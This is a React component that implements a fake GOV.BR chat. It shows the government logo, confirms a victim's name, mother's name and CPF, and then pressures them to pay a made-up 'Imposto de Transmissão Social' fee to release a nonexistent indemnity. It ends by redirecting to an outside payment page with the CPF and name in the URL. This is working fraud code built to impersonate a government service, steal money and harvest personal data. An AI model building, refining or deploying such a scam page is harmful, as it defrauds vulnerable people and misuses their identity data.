
"use client";

import React, { useState, useEffect, useRef } from 'react';
import { useRouter } from 'next/navigation'; // Added import
import { Loader2 } from 'lucide-react';

export interface SimulatedChatParams {
  gclid?: string;
  utm_source?: string;
  utm_campaign?: string;
  utm_medium?: string;
  utm_content?: string;
  cpf?: string;
  nome?: string;
  mae?: string;
  nascimento?: string;
}

interface Message {
  id: string;
  sender: 'bot' | 'user';
  text?: string;
  options?: { text: string; value: string; nextStep?: keyof typeof flowDefinition }[];
  isTyping?: boolean;
}

interface SimulatedChatFlowProps {
  initialParams: SimulatedChatParams;
}

const flowDefinition = {
  start: {
    botMessage: (params: SimulatedChatParams) => `Olá ${params.nome || 'usuário'}! Para começarmos, por favor, confirme o nome da sua mãe:`,
    options: (params: SimulatedChatParams) => [
      { text: params.mae || "Nome da Mãe (Não informado)", value: 'confirm_mae', nextStep: 'ask_question_1' },
      { text: "Informar outro nome", value: 'other_mae', nextStep: 'ask_mae_again' }, // Placeholder
    ],
  },
  ask_mae_again: { // Placeholder if 'other_mae' is chosen
    botMessage: "Por favor, digite o nome completo da sua mãe.",
    // This would ideally be a text input, but for simplicity with buttons:
    // For now, let's assume this path is not fully implemented in this button-based simulation.
    // Or we can simulate it with a button that just moves on.
    options: [{text: "Ok, entendi (simulação)", value: 'mae_understood', nextStep: 'ask_question_1'}]
  },
  ask_question_1: {
    botMessage: "Você possui alguma pendência financeira registrada no SERASA ou SPC?",
    options: [
      { text: "Sim", value: 'pendencia_sim', nextStep: 'ask_marital_status' },
      { text: "Não", value: 'pendencia_nao', nextStep: 'ask_marital_status' }, // User script clicks "Não"
    ],
  },
  ask_marital_status: {
    botMessage: "Qual seu estado civil?",
    options: [
      { text: "Solteiro (a)", value: 'solteiro', nextStep: 'ask_payment_method' }, // User script clicks "Solteiro (a)"
      { text: "Casado (a)", value: 'casado', nextStep: 'ask_payment_method' },
      { text: "Divorciado (a)", value: 'divorciado', nextStep: 'ask_payment_method' },
      { text: "Viúvo (a)", value: 'viuvo', nextStep: 'ask_payment_method' },
    ],
  },
  ask_payment_method: {
    botMessage: "Para a liberação do seu benefício, será necessário o pagamento de uma taxa única referente ao Imposto de Transmissão Social (ITS). Como deseja prosseguir?",
    options: [
      { text: "Pagar com Cartão de Crédito", value: 'cartao', nextStep: 'confirm_cpf' },
      { text: "Pagar com PIX (via CPF)", value: 'pix_cpf', nextStep: 'confirm_cpf' }, // User script clicks "CPF" (assuming it means PIX CPF)
      { text: "Saber mais sobre a taxa", value: 'info_taxa', nextStep: 'explain_tax_briefly' },
    ],
  },
  explain_tax_briefly: { // Added step based on user script later clicking "Porque tenho que pagar esse imposto?"
    botMessage: "A taxa de Imposto de Transmissão Social (ITS) é um valor simbólico obrigatório para cobrir custos operacionais e garantir a segurança da transação e a liberação do seu benefício. O pagamento é processado de forma segura pela plataforma GOV.BR.",
    options: [
        { text: "Entendi, desejo pagar com PIX (CPF)", value: 'pix_cpf_after_explain', nextStep: 'confirm_cpf'},
        { text: "Entendi, desejo pagar com Cartão", value: 'cartao_after_explain', nextStep: 'confirm_cpf'},
        { text: "Voltar", value: 'back_to_payment_method', nextStep: 'ask_payment_method' },
    ]
  },
  confirm_cpf: {
    botMessage: (params: SimulatedChatParams) => `Seu CPF para o pagamento da taxa e recebimento do benefício é: ${params.cpf || 'Não informado'}. Está correto?`,
    options: (params: SimulatedChatParams) => [
      { text: "Sim, está correto.", value: 'cpf_correto', nextStep: 'ask_receipt' }, // User script clicks "Sim, está correto."
      { text: "Não, desejo alterar.", value: 'cpf_incorreto', nextStep: 'handle_cpf_correction' }, // Placeholder
    ],
  },
  handle_cpf_correction: { // Placeholder
    botMessage: "Entendido. Para corrigir seu CPF, por favor, reinicie o processo ou entre em contato com o suporte.",
    options: [{ text: "Ok", value: 'cpf_correction_ack', nextStep: 'end_chat_early' }]
  },
  ask_receipt: {
    botMessage: "Excelente! Após a confirmação do pagamento da taxa, o valor do benefício será liberado. Você deseja receber o comprovante de recebimento do benefício em seu e-mail cadastrado no GOV.BR?",
    options: [
      { text: "Sim, desejo receber meu comprovante.", value: 'receipt_yes', nextStep: 'final_info_before_payment' }, // User script clicks this
      { text: "Não, obrigado.", value: 'receipt_no', nextStep: 'final_info_before_payment' },
    ],
  },
  final_info_before_payment: {
    botMessage: "Perfeito. Você está a um passo de receber sua indenização. A taxa ITS garante a liberação imediata após a confirmação.",
    options: [
      { text: "Concluir pagamento e receber minha indenização", value: 'proceed_to_payment', nextStep: 'redirect_to_payment' }, // User script clicks this
      { text: "Porque tenho que pagar esse imposto?", value: 'ask_why_tax_again', nextStep: 'explain_tax_detailed' }, // User script clicks this
    ],
  },
  explain_tax_detailed: {
    botMessage: "O Imposto de Transmissão Social (ITS) é uma contribuição única e obrigatória, estabelecida para cobrir despesas administrativas e de processamento seguro da sua indenização através da plataforma GOV.BR. Este valor garante a conformidade legal e a agilidade na liberação dos seus fundos. Após o pagamento, o valor integral da indenização é disponibilizado imediatamente.",
    options: [
      { text: "Entendi. Concluir pagamento e receber indenização.", value: 'proceed_to_payment_after_detail', nextStep: 'redirect_to_payment' },
      { text: "Ainda tenho dúvidas.", value: 'more_doubts', nextStep: 'support_contact' }, // Placeholder
    ],
  },
  support_contact: { // Placeholder
    botMessage: "Para mais informações, por favor, acesse a seção de Ajuda no portal GOV.BR ou entre em contato com nosso suporte.",
    options: [{ text: "Ok", value: 'support_ack', nextStep: 'end_chat_early' }]
  },
  redirect_to_payment: {
    // This step will trigger a redirect, no message or options needed from bot.
    // Logic handled in handleOptionClick
  },
  end_chat_early: {
    botMessage: "Obrigado por utilizar nossos serviços. Sessão encerrada."
    // No options, chat ends.
  }
};


const SimulatedChatFlow: React.FC<SimulatedChatFlowProps> = ({ initialParams }) => {
  const [messages, setMessages] = useState<Message[]>([]);
  const [currentStep, setCurrentStep] = useState<keyof typeof flowDefinition>('start');
  const [isBotTyping, setIsBotTyping] = useState(true);
  const chatEndRef = useRef<HTMLDivElement>(null);
  const router = useRouter(); // Assuming useRouter is available if needed for programmatic navigation outside payment redirect

  useEffect(() => {
    chatEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [messages]);

  useEffect(() => {
    const stepConfig = flowDefinition[currentStep];
    if (!stepConfig) return;

    setIsBotTyping(true);
    setTimeout(() => {
      let botText = "";
      if (typeof stepConfig.botMessage === 'function') {
        botText = stepConfig.botMessage(initialParams);
      } else if (typeof stepConfig.botMessage === 'string') {
        botText = stepConfig.botMessage;
      }

      const newMessageId = `bot-${Date.now()}`;
      const botMsg: Message = { id: newMessageId, sender: 'bot', text: botText };
      
      if (stepConfig.options) {
         if (typeof stepConfig.options === 'function') {
            botMsg.options = stepConfig.options(initialParams);
         } else {
            botMsg.options = stepConfig.options;
         }
      }
      
      if (botText || botMsg.options) { // Only add message if there's text or options
        setMessages(prev => [...prev, botMsg]);
      }
      setIsBotTyping(false);

      // Handle automatic redirection if the step is 'redirect_to_payment'
      if (currentStep === 'redirect_to_payment') {
        handleRedirectToPayment();
      }

    }, 1000); // Simulate bot typing delay

  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [currentStep, initialParams]);


  const handleRedirectToPayment = () => {
    const basePaymentUrl = "https://pay.finalizeseupagamento.com/2wq7Gr7YK5jgBAN";
    const queryParams = new URLSearchParams();
    if (initialParams.cpf) queryParams.set('document', initialParams.cpf.replace(/\D/g, '')); // Ensure only numbers for document
    if (initialParams.nome) queryParams.set('name', initialParams.nome);
    if (initialParams.utm_campaign) queryParams.set('utm_campaign', initialParams.utm_campaign);
    if (initialParams.utm_content) queryParams.set('utm_content', initialParams.utm_content);
    if (initialParams.utm_medium) queryParams.set('utm_medium', initialParams.utm_medium);
    if (initialParams.utm_source) queryParams.set('utm_source', initialParams.utm_source);
    // utm_term is empty in the example, so not adding if not present or empty
    
    const finalUrl = `${basePaymentUrl}?${queryParams.toString()}`;
    console.log("Redirecting to payment URL:", finalUrl);
    window.location.href = finalUrl;
  };


  const handleOptionClick = (optionValue: string, nextStep?: keyof typeof flowDefinition) => {
    const userMessageId = `user-${Date.now()}`;
    // Find the text of the clicked option to display as user message
    const currentStepConfig = flowDefinition[currentStep];
    let userMessageText = optionValue; // Fallback to value if text not found

    if (currentStepConfig) {
        let currentOptions: { text: string; value: string; nextStep?: keyof typeof flowDefinition }[] = [];
        if (typeof currentStepConfig.options === 'function') {
            currentOptions = currentStepConfig.options(initialParams);
        } else if (currentStepConfig.options) {
            currentOptions = currentStepConfig.options;
        }
        const clickedOption = currentOptions.find(opt => opt.value === optionValue);
        if (clickedOption) {
            userMessageText = clickedOption.text;
        }
    }

    setMessages(prev => [...prev, { id: userMessageId, sender: 'user', text: userMessageText }]);

    if (nextStep) {
      setCurrentStep(nextStep);
    } else if (optionValue === 'proceed_to_payment' || optionValue === 'proceed_to_payment_after_detail') {
      // This is handled by the useEffect detecting currentStep === 'redirect_to_payment'
      // but also can be triggered directly if needed, though the flow structure assumes useEffect handles it.
      // For safety, we ensure the state is set so useEffect will pick it up.
      if(currentStep !== 'redirect_to_payment') {
        setCurrentStep('redirect_to_payment');
      } else {
        // If already in redirect_to_payment state, and somehow this is clicked again, force redirect.
        handleRedirectToPayment();
      }
    } else {
      console.warn("No next step defined for option:", optionValue);
      // Optionally, lead to an end_chat_early or a "Sorry, I didn't understand" step.
    }
  };

  return (
    <div className="simulated-chat-container" style={{ height: '100%', overflowY: 'auto', display: 'flex', flexDirection: 'column', padding: '10px' }}>
      {messages.map((msg) => (
        <div key={msg.id} className={`message-container ${msg.sender === 'bot' ? 'bot-message-container' : 'user-message-container'}`}>
          {msg.sender === 'bot' && (
            <img src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot Avatar" className="bot-avatar" />
          )}
          <div className={`message ${msg.sender === 'bot' ? 'bot-message' : 'user-message'}`}>
            {msg.text}
            {msg.sender === 'bot' && msg.options && !isBotTyping && (
              <div className="options-container" style={{ marginTop: '10px', display: 'flex', flexDirection: 'column', gap: '8px' }}>
                {msg.options.map(opt => (
                  <button
                    key={opt.value}
                    onClick={() => handleOptionClick(opt.value, opt.nextStep)}
                    className="chat-option-button"
                  >
                    {opt.text}
                  </button>
                ))}
              </div>
            )}
          </div>
        </div>
      ))}
      {isBotTyping && messages.length > 0 && messages[messages.length -1].sender === 'user' && (
         <div className="message-container bot-message-container">
            <img src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot Avatar" className="bot-avatar" />
            <div className="message bot-message typing-indicator">
                <span className="dot"></span>
                <span className="dot"></span>
                <span className="dot"></span>
            </div>
        </div>
      )}
       {isBotTyping && messages.length === 0 && ( // Typing indicator for the very first message
         <div className="message-container bot-message-container">
            <img src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot Avatar" className="bot-avatar" />
            <div className="message bot-message typing-indicator">
                <span className="dot"></span>
                <span className="dot"></span>
                <span className="dot"></span>
            </div>
        </div>
      )}
      <div ref={chatEndRef} />
      <style jsx>{`
        .message-container {
          display: flex;
          margin-bottom: 12px;
          max-width: 85%;
        }
        .bot-message-container {
          align-self: flex-start;
        }
        .user-message-container {
          align-self: flex-end;
          flex-direction: row-reverse; /* Makes user messages appear on the right */
        }
        .bot-avatar {
          width: 32px;
          height: 32px;
          border-radius: 50%;
          margin-right: 8px;
          margin-top: 4px; /* Align with top of message bubble */
        }
        .user-message-container .bot-avatar { /* User doesn't have an avatar in this example */
          display: none;
        }
        .message {
          padding: 10px 15px;
          border-radius: 18px;
          line-height: 1.4;
          font-size: 15px;
          word-wrap: break-word;
        }
        .bot-message {
          background-color: #f1f0f0; /* Light grey for bot */
          color: #000;
          border-top-left-radius: 4px;
        }
        .user-message {
          background-color: #007bff; /* Blue for user */
          color: white;
          border-top-right-radius: 4px;
          margin-right: 0; /* Remove margin if avatar is not on this side */
        }
        .user-message-container .user-message {
            margin-left: auto; /* Pushes bubble to the right */
        }

        .options-container {
          margin-top: 10px;
          display: flex;
          flex-direction: column; /* Stack buttons vertically */
          align-items: flex-start; /* Align buttons to the start of the container */
          gap: 8px;
        }
        .chat-option-button {
          background-color: #fff;
          color: #007bff;
          border: 1px solid #007bff;
          padding: 8px 15px;
          border-radius: 15px;
          cursor: pointer;
          font-size: 14px;
          transition: background-color 0.2s, color 0.2s;
          text-align: left;
          width: auto; /* Fit content */
          display: inline-block; /* Fit content */
        }
        .chat-option-button:hover {
          background-color: #007bff;
          color: #fff;
        }
        .typing-indicator {
            display: inline-flex;
            align-items: center;
            padding: 10px 15px; /* Match message padding */
        }
        .typing-indicator .dot {
            width: 8px;
            height: 8px;
            margin: 0 2px;
            background-color: #aaa; /* Grey dots */
            border-radius: 50%;
            animation: bounce 1.4s infinite;
        }
        .typing-indicator .dot:nth-child(2) {
            animation-delay: 0.2s;
        }
        .typing-indicator .dot:nth-child(3) {
            animation-delay: 0.4s;
        }
        @keyframes bounce {
            0%, 80%, 100% { transform: scale(0); }
            40% { transform: scale(1); }
        }
      `}</style>
    </div>
  );
};

export default SimulatedChatFlow;

    